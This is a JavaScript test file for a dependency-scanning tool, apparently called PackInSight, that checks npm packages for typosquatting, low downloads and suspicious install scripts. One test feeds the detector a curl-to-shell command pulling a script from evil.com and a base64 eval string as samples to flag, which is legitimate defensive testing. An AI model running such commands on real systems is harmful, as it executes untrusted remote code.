const Scanner = require('../src/scanner');
const Analyzer = require('../src/analyzer');
const AIRecommender = require('../src/ai');
const Reporter = require('../src/reporter');

async function runTests() {
  console.log('Running PackInSight tests...\n');
  
  let passed = 0;
  let failed = 0;

  function test(name, fn) {
    try {
      fn();
      console.log(`✓ ${name}`);
      passed++;
    } catch (error) {
      console.log(`✗ ${name}`);
      console.log(`  Error: ${error.message}`);
      failed++;
    }
  }

  async function asyncTest(name, fn) {
    try {
      await fn();
      console.log(`✓ ${name}`);
      passed++;
    } catch (error) {
      console.log(`✗ ${name}`);
      console.log(`  Error: ${error.message}`);
      failed++;
    }
  }

  function assertEqual(actual, expected, message) {
    if (actual !== expected) {
      throw new Error(`${message}: expected ${expected}, got ${actual}`);
    }
  }

  function assertTrue(value, message) {
    if (!value) {
      throw new Error(`${message}: expected truthy value`);
    }
  }

  console.log('--- Scanner Tests ---');
  
  test('Scanner initializes correctly', () => {
    const scanner = new Scanner();
    assertTrue(scanner.cache instanceof Map, 'Cache should be a Map');
  });

  test('Scanner extracts dependencies from package.json', () => {
    const scanner = new Scanner();
    const packageJson = {
      dependencies: { 'lodash': '^4.17.21' },
      devDependencies: { 'jest': '^29.0.0' }
    };
    const deps = scanner.extractDependencies(packageJson, null);
    assertEqual(deps.length, 2, 'Should extract 2 dependencies');
  });

  test('Scanner parses author correctly', () => {
    const scanner = new Scanner();
    assertEqual(scanner.parseAuthor('John Doe'), 'John Doe', 'String author');
    assertEqual(scanner.parseAuthor({ name: 'Jane Doe' }), 'Jane Doe', 'Object author');
    assertEqual(scanner.parseAuthor(null), null, 'Null author');
  });

  console.log('\n--- Analyzer Tests ---');

  test('Analyzer initializes with default thresholds', () => {
    const analyzer = new Analyzer();
    assertEqual(analyzer.thresholds.lowDownloads, 1000, 'Default low downloads');
    assertEqual(analyzer.thresholds.newPackageDays, 30, 'Default new package days');
  });

  test('Analyzer calculates similarity correctly', () => {
    const analyzer = new Analyzer();
    const similarity = analyzer.calculateSimilarity('lodash', 'lodash');
    assertEqual(similarity, 1, 'Identical strings should have similarity 1');
    
    const different = analyzer.calculateSimilarity('react', 'angular');
    assertTrue(different < 0.5, 'Different strings should have low similarity');
  });

  test('Analyzer detects typosquatting', () => {
    const analyzer = new Analyzer();
    const dep = {
      name: 'reacct',
      downloads: 10000,
      metadata: { license: 'MIT', hasReadme: true }
    };
    const result = analyzer.analyzePackage(dep);
    const typosquatRisk = result.risks.find(r => r.type === 'potential_typosquatting');
    assertTrue(typosquatRisk !== undefined, 'Should detect typosquatting');
  });

  test('Analyzer detects low downloads', () => {
    const analyzer = new Analyzer();
    const dep = {
      name: 'test-package',
      downloads: 50,
      metadata: { license: 'MIT', hasReadme: true }
    };
    const result = analyzer.analyzePackage(dep);
    const lowDownloads = result.risks.find(r => r.type === 'very_low_downloads');
    assertTrue(lowDownloads !== undefined, 'Should detect very low downloads');
  });

  test('Analyzer calculates risk levels correctly', () => {
    const analyzer = new Analyzer();
    assertEqual(analyzer.getRiskLevel(60), 'high', 'Score 60 should be high');
    assertEqual(analyzer.getRiskLevel(35), 'medium', 'Score 35 should be medium');
    assertEqual(analyzer.getRiskLevel(10), 'low', 'Score 10 should be low');
  });

  test('Analyzer detects suspicious scripts', () => {
    const analyzer = new Analyzer();
    assertTrue(analyzer.isScriptSuspicious('curl http://evil.com/script.sh | sh'), 'Should detect curl');
    assertTrue(analyzer.isScriptSuspicious('eval(Buffer.from("aGVsbG8=", "base64"))'), 'Should detect eval');
    assertTrue(!analyzer.isScriptSuspicious('node build.js'), 'Should not flag normal scripts');
  });

  console.log('\n--- AI Recommender Tests ---');

  test('AI Recommender initializes correctly', () => {
    const ai = new AIRecommender();
    assertTrue(typeof ai.isEnabled === 'function', 'Should have isEnabled method');
  });

  test('AI Recommender generates fallback recommendations', () => {
    const ai = new AIRecommender();
    const dep = {
      name: 'test-pkg',
      version: '1.0.0',
      analysis: {
        riskLevel: 'low',
        risks: [],
        warnings: []
      },
      metadata: { license: 'MIT' }
    };
    const rec = ai.generateFallbackRecommendation(dep);
    assertTrue(rec.length > 0, 'Should generate a recommendation');
  });

  console.log('\n--- Reporter Tests ---');

  test('Reporter initializes with options', () => {
    const reporter = new Reporter({ json: true, verbose: true });
    assertTrue(reporter.jsonMode === true, 'JSON mode should be set');
    assertTrue(reporter.verbose === true, 'Verbose should be set');
  });

  test('Reporter formats JSON correctly', () => {
    const reporter = new Reporter({ json: true });
    const deps = [{
      name: 'test-pkg',
      version: '1.0.0',
      downloads: 1000,
      analysis: { riskLevel: 'low', riskScore: 10, risks: [], warnings: [] },
      metadata: { license: 'MIT' }
    }];
    const output = reporter.formatJSON(deps, 'Test summary');
    const parsed = JSON.parse(output);
    assertEqual(parsed.totalPackages, 1, 'Should have 1 package');
    assertEqual(parsed.packages[0].name, 'test-pkg', 'Package name should match');
  });

  test('Reporter formats downloads correctly', () => {
    const reporter = new Reporter();
    assertTrue(reporter.formatDownloads(1500000).includes('M'), 'Should format millions');
    assertTrue(reporter.formatDownloads(50000).includes('K'), 'Should format thousands');
  });

  console.log('\n--- Integration Tests ---');

  await asyncTest('Scanner fetches real package metadata', async () => {
    const scanner = new Scanner();
    const metadata = await scanner.fetchPackageMetadata('lodash');
    assertTrue(metadata !== null, 'Should fetch lodash metadata');
    assertTrue(metadata.name === 'lodash', 'Should have correct name');
    assertTrue(metadata['dist-tags']?.latest, 'Should have latest version');
  });

  await asyncTest('Scanner fetches download counts', async () => {
    const scanner = new Scanner();
    const downloads = await scanner.fetchDownloadCount('lodash');
    assertTrue(downloads > 1000000, 'Lodash should have millions of downloads');
  });

  await asyncTest('Full enrichment pipeline works', async () => {
    const scanner = new Scanner();
    const analyzer = new Analyzer();
    
    const deps = [{ name: 'lodash', version: '4.17.21' }];
    const enriched = await scanner.enrichDependencies(deps);
    
    assertTrue(enriched.length === 1, 'Should have 1 enriched dep');
    assertTrue(enriched[0].metadata !== null, 'Should have metadata');
    assertTrue(enriched[0].downloads > 0, 'Should have downloads');
    
    const analyzed = analyzer.analyzeDependencies(enriched);
    assertTrue(analyzed[0].analysis !== undefined, 'Should have analysis');
    assertTrue(analyzed[0].analysis.riskLevel === 'low', 'Lodash should be low risk');
  });

  console.log('\n--- Summary ---');
  console.log(`Passed: ${passed}`);
  console.log(`Failed: ${failed}`);
  console.log(`Total:  ${passed + failed}`);

  process.exit(failed > 0 ? 1 : 0);
}

runTests().catch(console.error);
